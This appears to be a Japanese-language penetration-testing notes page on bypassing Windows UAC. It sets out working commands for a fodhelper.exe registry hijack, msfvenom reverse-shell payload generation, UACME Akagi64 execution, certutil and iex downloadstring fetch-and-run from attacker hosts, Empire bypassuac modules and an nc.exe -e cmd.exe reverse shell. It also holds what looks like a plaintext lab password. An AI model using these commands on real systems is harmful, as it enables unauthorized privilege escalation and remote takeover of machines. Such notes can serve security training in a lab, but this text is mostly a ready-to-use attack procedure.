# UACByPass

* [情報収集](#情報収集)
* [fodhelper.exe](#fodhelper.exe)
* [UACME](#UACME)
* [Empire powershell](#Empire powershell)

### 情報収集

* Administrator group(`BUILTIN\Administrators`)で整合性レベル`medium`あることを確認

  ```
  whoami /groups 
  ```

* UAC設定の確認

  ```powershell
  Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object EnableLUA
  
  EnableLUA
  ---------
  1
  
  # check behavior 
  Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
  
  ConsentPromptBehaviorAdmin
  --------------------------
  5
  ```

  ```cmd
  # 1：UAC有効、0または存在しない場合はUACが非有効
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
  
      EnableLUA    REG_DWORD    0x1
  ```

  ```
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
  
      ConsentPromptBehaviorAdmin    REG_DWORD    0x5
  ```

  https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control

  

* 自動昇格するプロセスの確認

  ```cmd
  cd c:\windows\
  strings –s *.exe | findstr /i autoelevate
  ```

  https://learn.microsoft.com/ja-jp/sysinternals/downloads/strings

  ```
  sigcheck.exe -accepteula -m C:\Windows\System32\dccw.exe
  ```

  ![image-20230202192734371](img/UACByPass/image-20230202192734371.png)





### fodhelper.exe

オペレーティングシステムの言語変更を管理するMicrosoftのサポートアプリケーションであるfodhelper.exeを利用したUACbyPass.

「アプリと機能」のWindows設定画面で「オプション機能の管理」オプションを選択するたびに、このアプリケーションが起動する。

<img src="img/Windows/UACByPass/image-20230106075428758.png" alt="image-20230106075428758" style="zoom:67%;" />

* アプリケーションマニフェスト（プログラム起動時にOSがそのプログラムをどのように処理するかを示す情報を含む XML ファイル）の検査をする

  ```cmd
  cd C:\Tools\privilege_escalation\Sysintern
  sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
  ```

  ![image-20230106075632722](img/Windows/UACByPass/image-20230106075632722.png)

  ![](img/UACByPass/image-20230106075632722-1673224263122-2.png)

  * administrator アクセストークンが必要
  * autoelevate フラグが true に設定されているため、管理者ユーザーに同意を求めることなく、実行ファイルが自動的に高信頼性に昇格することが可能

* procmon（Sysinternals suite）で「NAME NOT FOUND」のレジストリを調査する

  * procmonを起動したのち、fodhelper.exeを再起動する

  * Filterで絞り込みを行う

    ![image-20230106080656214](img/Windows/UACByPass/image-20230106080656214.png)

    ![](img/UACByPass/image-20230106080656214-1673224302083-5.png)

  * `HKCU:\Software\Classes\ms-settings\shell\open\command`レジストリーキーが存在しないことがわかる。

    ![image-20230106080749582](img/Windows/UACByPass/image-20230106080749582.png)

    ![](img/UACByPass/image-20230106080749582-1673224338455-8.png)

  * `HKCU:\Software\Classes\ms-settings\shell\open\command`レジストリーキーの検索のあと、**HKEY_CLASSES_ROOT**（HKCR）ハイブで同じキーにアクセスし、成功している。

    レジストリーエディターでも確認することができる（regedit)

    ![image-20230106080943088](img/Windows/UACByPass/image-20230106080943088.png)

    ![](img/UACByPass/image-20230106080943088-1673224359152-11.png)
    
    詳細を調べるとDelegateExecuteキーの値を特定のCOMクラスIDに設定したのち(Default)動作を実行するという流れのよう

* HKCUハイブ内のms-settingレジストリキーを登録する

  ```cmd
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
  
  ---
  C:\Tools\privilege_escalation\SysinternalsSuite>REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
  The operation completed successfully.
  ```

* 次にDelegateExecuteエントリーを追加する

  ```cmd
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
  ```

  * /v：値の名前を指定
  * /t：型を指定

  ![image-20230106081615681](img/Windows/UACByPass/image-20230106081615681.png)

  ![](img/UACByPass/image-20230106081615681-1673224378809-14.png)

* procmonのフィルターを「SUCCESS」に変更する。

  ![image-20230106081707074](img/Windows/UACByPass/image-20230106081707074.png)

  ![](img/UACByPass/image-20230106081707074-1673224399075-17.png)

  （Default)のレジストリーキーが実行されている

* 新しいレジストリー値を指定する

  ```
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
  ```

* レジストリが正しく設定されたことを確認する

  ```
  REG QUERY HKCU\Software\Classes\ms-settings\Shell\Open\command
  ```

  

* 再度fodhelper.exeを実行するとコマンドプロンプトが立ち上がる

  ![image-20230106081939053](img/Windows/UACByPass/image-20230106081939053.png)

  ![](img/UACByPass/image-20230106081939053-1673224430178-20.png)

  パスワード変更もできることを確認する
  
  ```
  net user admin Ev!lpass
  ```
  
* powershellで実行するパターン（リバースシェル実行版）

  ```
  New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
  New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
  Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start C:\Users\Administrator\rev_1234.exe" -Force
  Start-Process "C:\Windows\System32\fodhelper.exe"
  Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
  ```

  ※リバースシェルの実行時のコマンドの記載に注意

  ```
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=12345 -f exe > rev_12345.exe
  ```

  

### UACME

https://github.com/hfiref0x/UACME

3. UACMeのリポジトリをクーロンする
     * ※masterブランチではなく、v3.2.xのブランチを使用すること

       ![image-20230114124559887](img/UACByPass/image-20230114124559887.png)
       
     * ※Akagi64.exeのコンパイル時はvisual studioのバージョンにあったSDKをプロパティから設定すること
     
       ![image-20230114124611192](img/UACByPass/image-20230114124611192.png)
     
  4. UAC bypass用のリバースシェルを作成する

     ```plaintext
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.17.20.12 LPORT=10010 -f exe > rev_10010_iga.exe
     ```
     
  5. Akagi64.exeとリバースシェルを配送する

     ```plaintext
     # kali
     /home/kali/Documents/tuikakensyu
     scp Akagi64.exe  test-student2@172.17.20.12:~/C2Server/igarashi/
     JwErS2wBLpnSr2G6RYR7Gvb9aWMechni
     
     # ws01
     certutil -urlcache -split -f "http://172.17.20.12:10018/Akagi64.exe" C:\tmp\igarashi\Akagi64.exe
     ```

     ```plaintext
     # kali
     scp rev_10010_iga.exe test-student2@172.17.20.12:~/C2Server/igarashi/
     JwErS2wBLpnSr2G6RYR7Gvb9aWMechni
     
     # ws01
     certutil -urlcache -split -f "http://172.17.20.12:10018/rev_10010.exe" C:\tmp\igarashi\rev_10010_iga.exe
     ```
     
  6. UACMeを実行する

     ```plaintext
     # C2Server
     nc -lvnp 10010
     C:\Users\makise\AppData\Roaming>Akagi64_iga.exe 33 C:\Users\makise\AppData\Roaming\rev_10010_iga.exe
     ```
     
  7. 権限昇格できたことを確認する

     ```plaintext
     whoami /all
     ```
     * Mandatory LabelがHighになっていること

     * sedebugprivilegeがついていること



### Empire powershell

* 事前にhttpリスナ及びlaunch.batのstagerでリバースシェルを取得しておく
* bypassuacのモジュールを何パターンか試す

```
usemodule powershell/privesc/bypassuac_env
execute
```

* Empire powershellのshellが使いづらいので`/home/kali/Documents/tools/nishang/Shells`のpsをリモート実行してリバースシェルを取得する。ps1ファイルの最後に実行するリバースシェルを記載する

  ![image-20230202193255845](img/UACByPass/image-20230202193255845.png)

* 以下コマンドをEmpire powershellで実行する

  ```cmd
  shell "iex(new-object net.webclient).downloadstring('http://192.168.119.133:8080/Invoke-PowerShellTcp.ps1')"
  ```

  ```bash
  nc -lvnp 443
  ```

* mimikatzを使う場合はnc.exeを配送し、ここからさらにリバースシェルを張る

  ```cmd
  .\nc.exe -nv 192.168.119.132 1234 -e cmd.exe
  ```

  
